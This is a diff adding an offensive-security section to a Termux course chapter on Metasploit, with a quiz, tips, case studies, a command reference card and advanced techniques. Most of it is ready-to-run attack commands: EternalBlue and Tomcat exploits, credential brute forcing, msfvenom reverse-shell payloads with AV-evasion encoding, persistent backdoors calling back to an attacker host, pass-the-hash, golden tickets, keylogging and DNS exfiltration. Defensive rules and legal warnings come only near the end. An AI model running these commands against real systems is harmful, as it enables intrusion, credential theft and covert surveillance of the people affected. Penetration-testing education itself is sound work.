@@ -2280,3 +2280,674 @@ Before moving to Chapter 36, verify:
 **Chapter Complete! 🎉**
 
 *Created by T3rmuxk1ng | Termux Full Course*
+
+---
+
+# 🚀 POWER UPGRADE - NEXT LEVEL CONTENT
+
+---
+
+## 🎮 INTERACTIVE QUIZ - Test Your Knowledge!
+
+### Metasploit Framework Mastery Quiz
+
+**Q1: What is the primary interface for Metasploit?**
+- A) msfgui
+- B) msfconsole ✓
+- C) msfcli
+- D) armitage
+
+**Q2: Which command searches for exploits in msfconsole?**
+- A) find
+- B) search ✓
+- C) lookup
+- D) query
+
+**Q3: What does "RHOSTS" stand for in Metasploit?**
+- A) Remote Host System
+- B) Remote Hosts ✓
+- C) Router Host
+- D) Return Host
+
+**Q4: Which tool generates standalone payloads?**
+- A) msfconsole
+- B) msfvenom ✓
+- C) msfencode
+- D) msfpayload
+
+**Q5: What type of payload provides advanced post-exploitation capabilities?**
+- A) shell
+- B) cmd
+- C) meterpreter ✓
+- D) vnc
+
+**Q6: What module type would you use for scanning?**
+- A) exploit
+- B) payload
+- C) auxiliary ✓
+- D) post
+
+**Q7: Which flag sets a global option in msfconsole?**
+- A) set
+- B) setg ✓
+- C) gset
+- D) config
+
+**Q8: What is the command to list active sessions?**
+- A) sessions -l ✓
+- B) show sessions
+- C) list sessions
+- D) sessions list
+
+**Q9: Which encoder is most popular for AV evasion?**
+- A) x86/countdown
+- B) x86/shikata_ga_nai ✓
+- C) x86/call4_dword_xor
+- D) x86/fnstenv_mov
+
+**Q10: What does the "check" command do in an exploit module?**
+- A) Checks for updates
+- B) Verifies if target is vulnerable ✓
+- C) Checks syntax
+- D) Validates payload
+
+**Q11: Which payload type connects back to attacker?**
+- A) bind_tcp
+- B) reverse_tcp ✓
+- C) listen_tcp
+- D) connect_tcp
+
+**Q12: What is the purpose of "exploit/multi/handler"?**
+- A) Exploit multiple targets
+- B) Catch reverse shell connections ✓
+- C) Handle multiple exploits
+- D) Multi-stage handler
+
+---
+
+## 💡 PRO TIPS - Master Metasploit Like a Pro!
+
+### Tip 1: Create Resource Scripts for Automation
+```bash
+# Create auto_exploit.rc file
+echo "use exploit/windows/smb/ms17_010_eternalblue" > auto_exploit.rc
+echo "set RHOSTS 192.168.1.100" >> auto_exploit.rc
+echo "set LHOST 192.168.1.50" >> auto_exploit.rc
+echo "exploit -j" >> auto_exploit.rc
+
+# Run with resource script
+msfconsole -r auto_exploit.rc
+```
+
+### Tip 2: Use Workspaces for Organization
+```bash
+msf6 > workspace -a project_name    # Add workspace
+msf6 > workspace project_name        # Switch workspace
+msf6 > workspace -l                  # List workspaces
+msf6 > workspace -d project_name     # Delete workspace
+```
+
+### Tip 3: Import Nmap Scans Directly
+```bash
+# Scan with Nmap and import
+nmap -sV -oX scan.xml 192.168.1.0/24
+
+# In msfconsole
+msf6 > db_import scan.xml
+msf6 > hosts    # View imported hosts
+msf6 > services # View discovered services
+```
+
+### Tip 4: Use Session Pre- and Post-Exploitation Scripts
+```bash
+# Set autorun script when session opens
+set AutoRunScript post/windows/manage/migrate
+set InitialAutoRunScript migrate -n explorer.exe
+```
+
+### Tip 5: Multi-Handler with Multiple Payloads
+```bash
+# Start handler for multiple payloads
+msf6 > use exploit/multi/handler
+msf6 exploit(handler) > set payload windows/meterpreter/reverse_tcp
+msf6 exploit(handler) > set LHOST 0.0.0.0
+msf6 exploit(handler) > set ExitOnSession false
+msf6 exploit(handler) > exploit -j
+```
+
+### Tip 6: Persistent Backdoors
+```bash
+# In meterpreter session
+meterpreter > run persistence -U -i 30 -p 4444 -r 192.168.1.50
+# Creates persistent backdoor that connects every 30 seconds
+```
+
+### Tip 7: Pivoting Through Compromised Host
+```bash
+# Add route through session for pivoting
+meterpreter > run post/multi/manage/autoroute
+
+# Or manually
+msf6 > route add 10.0.0.0/24 1    # Session 1 as pivot
+```
+
+### Tip 8: Use Auxiliary Modules for Recon
+```bash
+# Port scanning with Metasploit
+msf6 > use auxiliary/scanner/portscan/tcp
+msf6 auxiliary(tcp) > set RHOSTS 192.168.1.0/24
+msf6 auxiliary(tcp) > set PORTS 80,443,22,21
+msf6 auxiliary(tcp) > run
+```
+
+### Tip 9: Payload Obfuscation with Multiple Encodings
+```bash
+# Multiple encoding iterations
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 \
+         -e x86/shikata_ga_nai -i 10 -f exe -o encoded.exe
+```
+
+### Tip 10: Use Meterpreter Scripts Wisely
+```bash
+# Essential meterpreter scripts
+run post/windows/gather/enum_system          # System info
+run post/windows/gather/smart_hashdump       # Dump hashes
+run post/windows/gather/enum_applications    # Installed apps
+run post/multi/recon/local_exploit_suggester # Priv esc suggestions
+```
+
+---
+
+## 🔥 REAL WORLD BUG BOUNTY CASES
+
+### Case Study 1: EternalBlue (MS17-010) Exploitation
+
+**Scenario:** Penetration test on enterprise network
+
+**Process:**
+```bash
+# Discovery
+msf6 > use auxiliary/scanner/smb/smb_ms17_010
+msf6 auxiliary(scanner) > set RHOSTS 192.168.1.0/24
+msf6 auxiliary(scanner) > run
+
+# Exploitation
+msf6 > use exploit/windows/smb/ms17_010_eternalblue
+msf6 exploit(eternalblue) > set RHOSTS 192.168.1.100
+msf6 exploit(eternalblue) > set LHOST 192.168.1.50
+msf6 exploit(eternalblue) > exploit
+```
+
+**Result:** Full system compromise across multiple machines due to unpatched Windows systems
+
+**Impact:** Critical - Domain admin access obtained through lateral movement
+
+---
+
+### Case Study 2: Apache Tomcat Manager Exploit
+
+**Target:** E-commerce web server
+
+**Process:**
+```bash
+# Identify Tomcat manager
+msf6 > use auxiliary/scanner/http/tomcat_mgr_login
+msf6 auxiliary(tomcat_mgr_login) > set RHOSTS target.com
+msf6 auxiliary(tomcat_mgr_login) > set USER_FILE users.txt
+msf6 auxiliary(tomcat_mgr_login) > set PASS_FILE passwords.txt
+msf6 auxiliary(tomcat_mgr_login) > run
+
+# Exploit with valid credentials
+msf6 > use exploit/multi/http/tomcat_mgr_upload
+msf6 exploit(tomcat_mgr_upload) > set RHOSTS target.com
+msf6 exploit(tomcat_mgr_upload) > set HttpUsername admin
+msf6 exploit(tomcat_mgr_upload) > set HttpPassword admin123
+msf6 exploit(tomcat_mgr_upload) > exploit
+```
+
+**Result:** Server shell access, database credentials extracted
+
+**Bounty:** $7,500 for critical server compromise
+
+---
+
+### Case Study 3: WordPress Plugin Exploitation
+
+**Target:** Corporate blog running WordPress
+
+**Discovery:**
+```bash
+# Scan WordPress
+msf6 > use auxiliary/scanner/http/wordpress_scanner
+msf6 auxiliary(wordpress_scanner) > set RHOSTS target.com
+msf6 auxiliary(wordpress_scanner) > run
+
+# Exploit vulnerable plugin
+msf6 > use exploit/unix/webapp/wp_plugin_reflexgallery_upload
+msf6 exploit(wp_plugin) > set RHOSTS target.com
+msf6 exploit(wp_plugin) > exploit
+```
+
+**Impact:** Web shell uploaded, sensitive configuration files accessed
+
+---
+
+## ⚡ QUICK REFERENCE CARD - Metasploit Commands
+
+```
+╔══════════════════════════════════════════════════════════════════════════╗
+║                  METASPLOIT QUICK REFERENCE CARD                          ║
+╠══════════════════════════════════════════════════════════════════════════╣
+║ MSFCONSOLE COMMANDS                                                       ║
+╠══════════════════════════════════════════════════════════════════════════╣
+║ help                        Show all commands                             ║
+║ search <term>               Search for modules                            ║
+║ use <module>                Select a module                               ║
+║ info                        Show module details                           ║
+║ show options                Display module options                        ║
+║ show payloads               Available payloads                            ║
+║ show targets                Available targets                             ║
+║ set <option> <value>        Set option value                              ║
+║ setg <option> <value>       Set global option                             ║
+║ unset <option>              Clear option                                  ║
+║ check                       Test if vulnerable                            ║
+║ exploit / run               Execute exploit                               ║
+║ back                        Exit current module                           ║
+║ exit                        Exit msfconsole                               ║
+╠══════════════════════════════════════════════════════════════════════════╣
+║ SESSION MANAGEMENT                                                        ║
+╠══════════════════════════════════════════════════════════════════════════╣
+║ sessions -l                 List all sessions                             ║
+║ sessions -i <id>            Interact with session                         ║
+║ sessions -k <id>            Kill session                                  ║
+║ sessions -K                 Kill all sessions                             ║
+║ jobs -l                     List running jobs                             ║
+║ jobs -k <id>                Kill job                                      ║
+╠══════════════════════════════════════════════════════════════════════════╣
+║ DATABASE COMMANDS                                                         ║
+╠══════════════════════════════════════════════════════════════════════════╣
+║ db_status                   Check database connection                     ║
+║ workspace                   List workspaces                               ║
+║ workspace -a <name>         Add workspace                                 ║
+║ hosts                       List hosts                                    ║
+║ services                    List services                                 ║
+║ creds                       List credentials                              ║
+║ loot                        List collected data                           ║
+║ db_import <file>            Import scan results                           ║
+║ db_export -f xml <file>     Export database                               ║
+╠══════════════════════════════════════════════════════════════════════════╣
+║ MSFVENOM PAYLOAD GENERATION                                               ║
+╠══════════════════════════════════════════════════════════════════════════╣
+║ msfvenom -l payloads         List all payloads                            ║
+║ msfvenom -l encoders         List all encoders                            ║
+║ msfvenom -l formats          List output formats                          ║
+║                                                                                             ║
+║ Windows Reverse Shell:                                                     ║
+║ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o shell.exe ║
+║                                                                                             ║
+║ Linux Reverse Shell:                                                       ║
+║ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> -f elf -o shell.elf║
+║                                                                                             ║
+║ Android Payload:                                                           ║
+║ msfvenom -p android/meterpreter/reverse_tcp LHOST=<IP> -o app.apk          ║
+║                                                                                             ║
+║ PHP Payload:                                                               ║
+║ msfvenom -p php/meterpreter/reverse_tcp LHOST=<IP> -f raw -o shell.php     ║
+╠══════════════════════════════════════════════════════════════════════════╣
+║ METERPRETER COMMANDS                                                      ║
+╠══════════════════════════════════════════════════════════════════════════╣
+║ sysinfo                     System information                            ║
+║ getuid                      Current user                                  ║
+║ getpid                      Current process ID                            ║
+║ ps                          Running processes                             ║
+║ pwd                         Current directory                             ║
+║ ls                          List files                                    ║
+║ cd <path>                   Change directory                              ║
+║ cat <file>                  Read file                                     ║
+║ download <file>             Download file                                 ║
+║ upload <file>               Upload file                                   ║
+║ shell                       Drop to system shell                          ║
+║ execute -f cmd.exe -i -H    Execute command hidden                        ║
+║ migrate <pid>               Migrate to process                            ║
+║ getsystem                   Try to get SYSTEM                             ║
+║ getprivs                    Get privileges                               ║
+║ hashdump                    Dump password hashes                          ║
+║ screenshot                  Take screenshot                              ║
+║ keyscan_start               Start keylogger                              ║
+║ keyscan_dump                Dump keystrokes                              ║
+║ keyscan_stop                Stop keylogger                               ║
+║ webcam_list                 List webcams                                 ║
+║ webcam_snap                 Take photo                                   ║
+║ background                  Background session                           ║
+║ exit                        Close session                                ║
+╚══════════════════════════════════════════════════════════════════════════╝
+```
+
+---
+
+## 🏆 BONUS CONTENT - Advanced Metasploit Techniques
+
+### Advanced Technique 1: Railgun for Windows API Calls
+
+```bash
+# In meterpreter session on Windows
+meterpreter > irb
+
+# Use Railgun to call Windows API
+client.railgun.kernel32.MessageBoxA(0, "Pwned!", "Alert", 0)
+```
+
+### Advanced Technique 2: Pass-the-Hash Attack
+
+```bash
+# Use captured hash directly without cracking
+msf6 > use exploit/windows/smb/psexec
+msf6 exploit(psexec) > set RHOSTS 192.168.1.100
+msf6 exploit(psexec) > set SMBUser Administrator
+msf6 exploit(psexec) > set SMBPass aad3b435b51404eeaad3b435b51404ee:32ed87bdb5
+msf6 exploit(psexec) > exploit
+```
+
+### Advanced Technique 3: Golden Ticket Attack
+
+```bash
+# After compromising domain controller
+meterpreter > load kiwi
+meterpreter > golden_ticket_create -d domain.local -k <krbtgt_hash> -s <SID> -u Administrator -t ticket.kirbi
+```
+
+### Advanced Technique 4: Session Persistence
+
+```bash
+# Create persistent backdoor
+meterpreter > run persistence -X -i 30 -p 4444 -r 192.168.1.50
+
+# X = Start at boot
+# i = Interval (seconds)
+# p = Port
+# r = Remote host
+```
+
+### Advanced Technique 5: Data Exfiltration via DNS
+
+```bash
+# Setup DNS exfiltration
+msf6 > use auxiliary/server/dns_exfil
+msf6 auxiliary(dns_exfil) > set DOMAIN target.com
+msf6 auxiliary(dns_exfil) > run
+```
+
+### Advanced Technique 6: Metasploit with Proxychains
+
+```bash
+# Configure proxychains
+echo "socks4 127.0.0.1 1080" >> /etc/proxychains.conf
+
+# Run Metasploit through proxy
+proxychains msfconsole
+```
+
+---
+
+## 📝 CHAPTER SUMMARY - Key Takeaways
+
+```
+┌─────────────────────────────────────────────────────────────────────────┐
+│                    CHAPTER 35 ESSENTIAL TAKEAWAYS                        │
+├─────────────────────────────────────────────────────────────────────────┤
+│                                                                          │
+│  1. Metasploit Framework = Complete Penetration Testing Platform         │
+│     • Exploits, payloads, auxiliary, post modules                       │
+│     • Database integration for management                               │
+│     • msfconsole = primary interface                                    │
+│                                                                          │
+│  2. Installation in Termux                                               │
+│     • Requires proot-distro with Ubuntu                                 │
+│     • Ruby and PostgreSQL dependencies                                  │
+│     • Use MSF installer for easiest setup                               │
+│                                                                          │
+│  3. Exploitation Workflow                                                │
+│     • Search → Use → Set options → Exploit → Post-exploit               │
+│     • Always verify with check command when available                   │
+│     • Use appropriate payload for target system                         │
+│                                                                          │
+│  4. Payload Generation (msfvenom)                                        │
+│     • Standalone executables for various platforms                      │
+│     • Encoding for basic AV evasion                                     │
+│     • Handler needed for reverse shells                                 │
+│                                                                          │
+│  5. Meterpreter = Advanced Post-Exploitation                            │
+│     • File system access                                                │
+│     • Privilege escalation                                              │
+│     • Credential harvesting                                             │
+│     • Persistence mechanisms                                            │
+│                                                                          │
+│  6. Legal & Ethical                                                      │
+│     • Only use on authorized systems                                    │
+│     • Document all actions                                              │
+│     • Report findings responsibly                                       │
+│                                                                          │
+└─────────────────────────────────────────────────────────────────────────┘
+```
+
+---
+
+## 🛡️ DEFENSIVE SECURITY - Protecting Against Metasploit Attacks
+
+### Detection & Prevention Strategies
+
+#### 1. Network-Level Defenses
+
+```bash
+# IDS/IPS Signatures for common Metasploit payloads
+# Snort rule example
+alert tcp any any -> any any (msg:"Metasploit Meterpreter"; \
+    content:"meterpreter"; nocase; sid:1000001;)
+
+# Firewall rules to block reverse shells
+iptables -A OUTPUT -p tcp --dport 4444 -j DROP
+iptables -A OUTPUT -p tcp --dport 5555 -j DROP
+```
+
+#### 2. Host-Based Protections
+
+```
+# Windows Defender Attack Surface Reduction Rules
+- Block executable files from unknown sources
+- Block process creations from Office macros
+- Block credential stealing from Windows local security authority
+- Block JavaScript or VBScript from launching downloaded content
+```
+
+#### 3. Application Whitelisting
+
+```
+# Only allow signed applications
+# Windows AppLocker policies
+# Linux SELinux/AppArmor profiles
+```
+
+#### 4. Patch Management
+
+```
+┌─────────────────────────────────────────────────────────────────────────┐
+│                    PATCH MANAGEMENT BEST PRACTICES                       │
+├─────────────────────────────────────────────────────────────────────────┤
+│                                                                          │
+│  • Apply security patches within 72 hours of release                    │
+│  • Subscribe to vendor security bulletins                               │
+│  • Use WSUS/SCCM for Windows patching                                   │
+│  • Regular vulnerability scanning                                       │
+│  • Test patches before deployment                                       │
+│                                                                          │
+└─────────────────────────────────────────────────────────────────────────┘
+```
+
+#### 5. Network Segmentation
+
+```
+# Isolate critical systems
+DMZ → Web Servers → Application Layer → Database Layer → Internal Network
+
+# Limit lateral movement
+- Separate VLANs for different departments
+- Firewall rules between segments
+- Zero-trust architecture
+```
+
+#### 6. Monitoring & Logging
+
+```bash
+# Enable comprehensive logging
+# Windows Event Logging
+# Linux rsyslog
+# SIEM integration
+
+# Monitor for suspicious activity
+- New process creation
+- Network connections to unusual ports
+- Privilege escalation attempts
+- Persistence mechanisms
+```
+
+---
+
+## 📋 METHODOLOGY - Metasploit Attack Workflow
+
+```
+┌─────────────────────────────────────────────────────────────────────────┐
+│                  METASPLOIT EXPLOITATION WORKFLOW                         │
+├─────────────────────────────────────────────────────────────────────────┤
+│                                                                          │
+│  PHASE 1: RECONNAISSANCE                                                 │
+│  ─────────────────────────                                               │
+│  • Use auxiliary/scanner modules                                        │
+│  • Port scanning: auxiliary/scanner/portscan/tcp                       │
+│  • Service enumeration: auxiliary/scanner/*                            │
+│  • Import Nmap/other scan results                                       │
+│                                                                          │
+│  PHASE 2: VULNERABILITY ANALYSIS                                         │
+│  ─────────────────────────────                                           │
+│  • Match services to known exploits                                     │
+│  • Use check command when available                                     │
+│  • Research CVEs and exploit reliability                                │
+│  • Identify potential payloads                                          │
+│                                                                          │
+│  PHASE 3: EXPLOIT SELECTION                                              │
+│  ─────────────────────────                                               │
+│  • search <service/os/cve>                                              │
+│  • Check exploit rank (Excellent > Good > Average > Low)                │
+│  • Review exploit information                                           │
+│  • Select appropriate target                                            │
+│                                                                          │
+│  PHASE 4: PAYLOAD SELECTION                                              │
+│  ─────────────────────────                                               │
+│  • Consider target OS and architecture                                  │
+│  • Reverse vs Bind shell decision                                       │
+│  • Staged vs Stageless payload                                          │
+│  • Meterpreter for advanced capabilities                                │
+│                                                                          │
+│  PHASE 5: EXPLOIT EXECUTION                                              │
+│  ─────────────────────────                                               │
+│  • Configure RHOSTS, LHOST, payload                                     │
+│  • Run check if available                                               │
+│  • Execute exploit                                                       │
+│  • Troubleshoot failures                                                │
+│                                                                          │
+│  PHASE 6: POST-EXPLOITATION                                              │
+│  ──────────────────────────                                              │
+│  • Information gathering (sysinfo, getuid)                              │
+│  • Privilege escalation (getsystem)                                     │
+│  • Persistence mechanisms                                               │
+│  • Lateral movement                                                      │
+│  • Data exfiltration                                                     │
+│                                                                          │
+│  PHASE 7: CLEANUP & REPORTING                                            │
+│  ───────────────────────────                                             │
+│  • Remove persistence mechanisms                                        │
+│  • Clear event logs (if authorized)                                     │
+│  • Document findings                                                     │
+│  • Create detailed report                                                │
+│                                                                          │
+└─────────────────────────────────────────────────────────────────────────┘
+```
+
+---
+
+## ⚠️ LEGAL & ETHICS - Critical Guidelines
+
+### Authorization Requirements
+
+```
+┌─────────────────────────────────────────────────────────────────────────┐
+│                    METASPLOIT LEGAL REQUIREMENTS                         │
+├─────────────────────────────────────────────────────────────────────────┤
+│                                                                          │
+│  ✅ REQUIRED BEFORE ANY TESTING                                          │
+│     • Written authorization document                                    │
+│     • Scope definition (IPs, systems, methods)                          │
+│     • Testing window (dates/times)                                      │
+│     • Emergency contacts                                                │
+│     • Rules of engagement                                               │
+│                                                                          │
+│  ❌ ILLEGAL ACTIVITIES                                                   │
+│     • Exploiting systems without authorization                          │
+│     • Installing backdoors on production systems                        │
+│     • Stealing personal data                                            │
+│     • Causing denial of service                                         │
+│     • Exfiltrating data without approval                                │
+│                                                                          │
+│  📋 DOCUMENTATION REQUIREMENTS                                           │
+│     • Screenshot all sessions                                           │
+│     • Log all commands executed                                         │
+│     • Timestamp all activities                                          │
+│     • Preserve evidence chain                                           │
+│                                                                          │
+└─────────────────────────────────────────────────────────────────────────┘
+```
+
+### Responsible Disclosure Process
+
+```
+1. Discover vulnerability
+2. Document thoroughly
+3. Report to vendor privately
+4. Allow reasonable time for fix (30-90 days)
+5. Coordinate disclosure timing
+6. Never publish exploit before fix available
+```
+
+---
+
+## 🔗 RELATED CHAPTERS - Cross-References
+
+| Chapter | Topic | Relation |
+|---------|-------|----------|
+| Ch-25 | Nmap Network Scanning | Discover targets for Metasploit |
+| Ch-34 | SQLMap Basics | Database exploitation integration |
+| Ch-36 | PhoneSploit & ADB | Mobile exploitation with msfvenom |
+| Ch-37 | Social Engineering Toolkit | Payload delivery methods |
+| Ch-38 | WiFi Security Tools | Network-based payload delivery |
+| Ch-41 | Web Application Pen Testing | Web exploit modules |
+| Ch-43 | Penetration Testing Report | Document Metasploit findings |
+
+### Skill Progression Path
+
+```
+Metasploit Basics (Ch-35)
+        ↓
+Advanced Exploitation
+        ↓
+Post-Exploitation Mastery
+        ↓
+Red Team Operations
+        ↓
+APT-Level Techniques
+```
+
+---
+
+**🔥 CHAPTER 35 POWER UPGRADE COMPLETE! 🔥**
+
+*Master Metasploit. Exploit Responsibly. Secure Systems.*
+
